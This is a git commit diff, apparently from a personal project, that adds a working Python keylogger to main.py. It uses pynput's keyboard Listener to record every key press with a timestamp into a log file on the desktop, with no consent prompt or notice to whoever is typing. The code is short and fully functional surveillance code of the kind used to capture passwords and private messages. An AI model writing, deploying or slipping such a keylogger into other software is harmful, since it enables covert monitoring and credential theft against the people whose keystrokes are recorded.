e8abaec6f36c2e99535b29e157d26d3f4b3e101d
david840706tw <develop.tung@gmail.com>
2020-11-30 23:43:55 +0800

    commit

--- main.py
+++ main.py
@@ -1,5 +1,22 @@
+from os import write
 from pynput.keyboard import Listener
 
 import os
 import logging
 from shutil import copyfile
+
+username = os.getlogin()
+logging_directory = f"/Users/davidtung/Desktop"
+
+# print(logging_directory)
+
+logging.basicConfig(filename=f"{logging_directory}/mylog.txt",
+                    level=logging.DEBUG, format="%(asctime)s: %(message)s")
+
+
+def key_handler(key):
+    logging.info(key)
+
+
+with Listener(on_press=key_handler) as listener:
+    listener.join()
